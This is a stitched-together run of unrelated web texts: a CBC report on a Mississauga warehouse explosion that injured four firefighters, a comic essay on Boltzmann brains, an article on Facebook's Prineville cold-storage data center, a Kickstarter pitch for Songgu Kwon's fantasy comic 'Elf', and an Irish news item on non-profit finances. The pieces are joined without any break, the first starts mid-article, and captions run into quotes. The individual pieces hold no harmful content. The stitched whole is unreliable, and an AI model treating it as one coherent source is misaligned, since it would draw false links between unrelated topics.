Peel Regional Police Const. Thomas Ruttan said Wednesday that the warehouse is a storage facility for imported goods that included butane lighters and aerosol cans of insect spray, which appear to be the cause of the explosion.
Four firefighters were injured. At least three of those firefighters were taken to hospital. One was treated for smoke inhalation.
The explosion also blew out the windows of a fire truck. The heat melted parts of its exterior.
"We are incredibly fortunate that nobody was killed," Laing said.

The most seriously injured firefighter was reported to be in critical condition when initially taken to hospital.
Fire officials offered conflicting information on his status as of late Wednesday afternoon — Laing said he had been informed that individual was in serious, stable condition, while Fire Chief John McDougall said he remained critical.
"They are improving, there's two or three of them that are undergoing surgery and some need more surgery but they seem to be stable," McDougall told reporters.
"The most serious one is reported to me as being critical, but stable. So, we're hoping that improves over the next few hours."
Those firefighters suffered "blast injuries," as opposed to burns, McDougall said.
Police said air quality was a major concern following the Mississauga, Ont., fire due to the potential nature of the substances stored in the building. Air quality tests were conducted throughout the day, but no neighbourhood homes had to be evacuated. (Tony Smyth/CBC)
McDougall said the injured firefighters all are "very experienced" and each had between five and 20 years of service.
Mississauga Mayor Hazel McCallion said the city has dealt with many fires over the years, though one like this was not expected.
"It really has been a very sad day for us," she said, when speaking with reporters Wednesday afternoon.
McCallion said it is her understanding that the building was inspected by firefighters a year ago, but it was vacant at the time of that inspection.
The mayor said city staff are trying to confirm whether or not the business in that building had been granted an occupancy permit.
Ken Cree, the former manager of the property, said the 2,800-square-metre warehouse was sold last year.
The fire at a Mississauga, Ont., warehouse Wednesday morning has been extinguished, but black smoke continues to billow from the building's remains. (Linda Ward/CBC) "The building is fire-monitored and the building is sprinklered, so I'm not quite sure why it got so bad," he told CBC News.
Twelve hours after they first arrived, firefighters were still dealing with hot spots at the scene.
The cause of the fire remains unknown.
The Office of the Fire Marshal, the Ministry of Environment and the Ministry of Labour were at the scene, in addition to investigators with the fire service.
The CBC's Shannon Martin reported that the Ministry of Environment had a mobile unit on scene. Air quality tests were conducted throughout the day, but no neighbourhood homes had to be evacuated.
The Mississauga firefighters Association tweeted their thanks for the thoughts and prayers of others on Wednesday.
Firefighters from other cities tweeted their condolences to their colleagues in Mississauga:
In an infinite universe where random configurations of particles spontaneously pop in and out of existence, somewhere — albeit somewhere far away — a brain has improbably materialized, floating through outer space for a few milliseconds before dying, the most perfect symbol for existential despair since Kafka wrote about a big cockroach or this cat video was posted.
Other things have appeared too: a horse, a Skeksis, a catdog, anything and everything; it's simply a matter of a few googol light-years before objects like the infinity gauntlet show up. In fact, since a perfectly tweaked clockwork universe like ours is so enormously unlikely, it's much more probable you're just a space brain, or what physicists call a Boltzmann brain. Your memories are a random configuration of images and events that just happen to make sense. You are a meaningless aberration, a fluctuation in the endless entropy.
So how can you tell if you're a Boltzmann brain? First of all, examine your world and ask yourself if there are any illogical features like, say, pet psychics, dark matter, or manatees. Does your universe contain uniform microwave background radiation temperature uncharacteristic of an expanding universe? Have you ever greeted someone you thought was a friend, but then you realized it was a stranger, and you were like, “Oh, uh, I don't, uh, I thought you were someone else…”? Do fuzzy pens exist? Are there clowns? Do more people watch Two and a Half Men than Community? These are the cracks in the simulation, the glitches in the system indicative of a fake imaginary world.
Second of all, most of your past, being implanted, would seem hazy and vague. For example, you wouldn't remember being a baby or what you ate for dinner on this day twelve years ago or every word of every book you ever read. It sounds crazy, but Boltzmann brains wouldn't even remember how many cats they'd seen in their lives. If you can't summon up a cumulative number of cats observed during your life (for me, it's 2,452), you're definitely a Boltzmann brain. Your memories are a random construct, a blur of empirical details and visceral sensory information fed into your brain as it floats through the void past asteroids and nebulas.
A Boltzmann brain would secretly suspect he/she was the only one who mattered, the only one who was “real.” Do you feel on a primal level your life is more important than other lives, that your existence is the gigantic glowing sun around which the all of humanity revolves? Perhaps you have the odd feeling everyone you meet is a realistic robot programmed to interact with you in a convincingly reasonable way like The Truman Show but with robots. If you answered yes, it's not because you're a psychopath (well, you might be a psychopath); it's because, as a lonely space brain floating through the void, you have no real friends, family, or acquaintances — only imaginary people embedded in your dumb brain by the ceaseless machinations of an apathetic universe.
You might be thinking, ‘I know I'm not a Boltzmann brain because they die after, like, a few seconds, and I'm conscious of way more time than that. That is, I experience the passage of time.' Oh, do you, though? Do you, Mister/Miss Space-Brain? By the time you're conscious of any given moment, it's already slipped off into memory, and besides, it could be your perception of time is elongated by your crazy space brain. This exact moment could be your first and last moment of genuine self-awareness. Right now, your space brain could be on the verge of becoming freeze-dried space-brain-meat for hungry space-cats om nom nom.
With this helpful information in mind (space-mind), hopefully you know now whether your world is real or you're a sad lump of tissue surrounded by infinite nothingness. But if, God forbid, it's the latter, what can you do with this newfound cognizance, particularly in light of the fact you only have a matter of seconds left before becoming a hunk of jerky for Uatu the Watcher to observe with bemusement and maybe a touch of melancholy. How shall you spend these last few instants since nothing you do matters, and the people you love aren't real? Hmm?
Why not invest your last moment in a profound thought, something deep and meaningful and life affirming. Like kittens. Like a cute kitten that's trying to jump on top of a watermelon but keeps sliding off because its claws can't get traction. Oh, that's a good thought. Maybe the watermelon almost rolls over the kitten, but it jumps out of the way and meows at the watermelon. That'd be so cute. That makes it all worthwhile, doesn't it?
Facebook expands data storage facilities in Prineville
View the Slideshow >>

PRINEVILLE -- Remember that silly picture of your kid's birthday? The one you posted on Facebook a couple years back?
Well, it's still there. So are more than 240 billion other photos and billions more videos and status updates. Facebook's users add another 350 million photos every day.
Facebook knows you might want to see your old photos again someday. Or scroll back through your Timeline to revisit your posts as an online diary. But storing all those pictures – and keeping them immediately available – takes a lot of space.
Not in the physical sense, but in the virtual. That means lots of hard drives, lots of storage – and lots of energy.
So Facebook is preparing to try out a more efficient storage system at its Prineville data center, "cold storage" for those archival posts that people don't need every day, but that they don't want to lose altogether.
Josh Crass, manager of Facebook's Prineville data center, inside an existing "hot storage" facility.
Facebook says 82 percent of its traffic is focused on just 8 percent of its photos. Its cold storage facility is designed to create a more efficient way to store those photos that aren't in heavy rotation.
The cold storage building is just a skeletal frame now, and a concrete pad. Facebook hopes to have the first of three phases up and running by fall. Each of the three 16,000-square-foot data hubs could hold an exabyte of data – equivalent to 1 million hard drives inside a contemporary PC.
Facebook already has two massive data centers in Prineville, the first the company built anywhere. The tens of thousands of servers inside those buildings are always on, ready to deliver your pictures and musings to your Facebook friends around the world.
Facebook in Prinevile
Opened: April, 2011
Facilities: Two 330,000-square-foot data centers, with room for a third. One data center is fully operational; construction of the second is complete, but it isn't fully equipped yet. Additionally, Facebook is building a 62,000-square-foot "cold storage" facility on its 127-acre property.
Employees: 70
Total investment: $285 million, as of January 1, 2012 (since then, Facebook has fully equipped one data center and built a second one.)
Tax breaks: Property tax exemptions valued at $4.4 million for 2012, the latest data available.
By contrast, most of the computers in the new cold storage facility will be asleep. A few will be alert, awaiting a request for old material and ready to summon the slumbering computers to provide their data. This material won't reach your computer as quickly as something posted just a few hours ago – but Facebook says it won't take long.
“The principle will be so that it doesn't impact the user experience – so think about a matter of seconds, or milliseconds,” said Michael Kirkland, a Facebook communication manager.
Facebook estimates a cold-storage data center will cost one-third less than its standard data center. It designed the cold storage facilities to be smaller than live data centers – each rack of servers has eight times more storage than in “hot storage” – and five times more energy efficient. That's a big consideration in the data center industry, which uses mammoth amounts of electricity to power and cool its computers.
Facebook says it used 71 million kilowatts of power in the first nine months of its operations in Prineville – equivalent to the power use in 6,000 homes. That total will continue to rise as more of the facility comes online.
Few technology companies accumulate more data than Facebook, which has more than 1 billion members. But data collection and analysis is key in many kinds of industries, and the volume of data is rapidly accumulating all over.
“We're kind of at the forefront of that problem,” Kirkland said, “but pretty soon it's going to be everyone's problem.”

Songgu Kwon writes for Bleeding Cool:
Elf, a fantasy graphic novel
Elf is firmly rooted in the classic European high-fantasy genre of Tolkien and Dungeons & Dragons. Within its pages, you'll find a blend of surreal humor, emphasis on authentic depictions of medieval combat, and even poignant tragedy. As one of my readers enthusiastically put it:
“If you're into comics…
great artwork…
great storytelling…
and a good punchline…
If you're into military history… old weapons, fighting stances…
If you ever considered owning a Monster Manual, Player's Handbook, or DM guide….Songgu Kwon's web comic is worth the read! If the campaign is successful, the comic will be available in book form, and you NEED IT! Check it out!”
Elf has also been described in one instance as “Tolkien meets Monty Python”. I would say this is a fair description. This comic is recommended for mature readers, less for the gory violence, harsh language, nudity, and sexual content that pepper its pages, but more for its mature and complex themes that some younger readers may not fully appreciate.
The goal of my kickstarter campaign is to produce a hard bound book of exceptional quality which will collect all of the stories in the series, along with a wealth of additional materials like concept and pin-up art, as well as an exclusive story which will not be featured anywhere else. The emphasis here is on making something that's really well made and substantial.
Many of the readers that have supported my crowd funding campaign so far have been from the UK and Europe. I am extremely grateful for this, because it means that despite the steep overseas shipping charges, they have chosen to back me anyway.
I've always been fascinated with the myths and fables of Europe and I have greatly admired the works of European masters of comic art, such as Milo Manara and Moebius. This has obviously influenced my work and it's been my impression that many European readers appreciate my comics for that. I will endeavor in the future to try to make more comics for the European market.
A fellow comic creator and friend, Daniel de Sosa of Oi!, who lives in London, recommended that I try to submit my project to Bleeding Cool. He's currently helping me to promote my project by distributing flyers to various spots in the city. If I should meet my crowd-funding goal, I will, in honor of my friend and the readers of Bleeding Cool, cut a watermelon in half with one of my swords and post the video on my Kickstarter page. I will do this! :O
About me:
Ever since I was a little kid, I was strongly drawn to comic books. In 2nd grade, I played hooky from many a Tae Kwon Do lesson to take refuge in the local comic book shop to read comics!
When I was in 8th grade, my passion for mythology, heroic fables and drawing was given a new outlet when my friends introduced me to the world of tabletop fantasy role playing games.
I am a comic book artist/writer and freelance illustrator. I also teach character design at Gnomon School of Visual Effects in Hollywood, California.
I published my first graphic novel, Blanche the Baby Killer #0, in 2001 after winning the Xeric Grant for indie comic artists. Blanche #0 was translated and reprinted in French by publisher Wetta Worldwide in 2007. I subsequently contributed comics to Heavy Metal Magazine as well as a number of independent comic anthologies.
In 2007 I took a hiatus from the world of print, when the opportunity arose to work as lead character designer for the popular Adult Swim animated show, Metalocalypse. The show ran from 2007 to 2012, during which time I designed and drew well over 1000 unique characters.
Later that year, I decided to return to my first love, the graphic novel, and started drawing Elf. Taking advantage of the Internet to post a page every week, what began as a series of one-page gags has slowly evolved into more expansive and complex story arcs. More than two years after inking the first page, I've decided Elf is ready to go to print.

Non-profit organisations in Ireland have a turnover of €11bn per annum and account for 8% of all current government spending but more than a quarter of the organisations do not publish full accounts.
However a new report from Benefacts, which was set up to provide information on the sector, has found that high pay is not common in the sector.
It finds that employees in the non-profit sector are more than 25 times less likely to earn €70,000 per annum than those in the private sector.
The vast majority of those on salaries above €70,000 working for non-profit companies are employed in Section 38 organisations where pay is set by reference to public sector pay grades.
Welcoming the report, Minister for Public Expenditure and Reform Paschal Donohoe said his department has funded Benefacts because of the value in establishing and sharing facts about the sector.
European Ombudsman Emily O'Reilly said the non-profit sector had been long taken for granted.
However, she added that recent controversy had opened a debate on the role of non-profits in health care.
She said the value of the data provided by Benefacts is that it makes government and others better informed when making decisions.
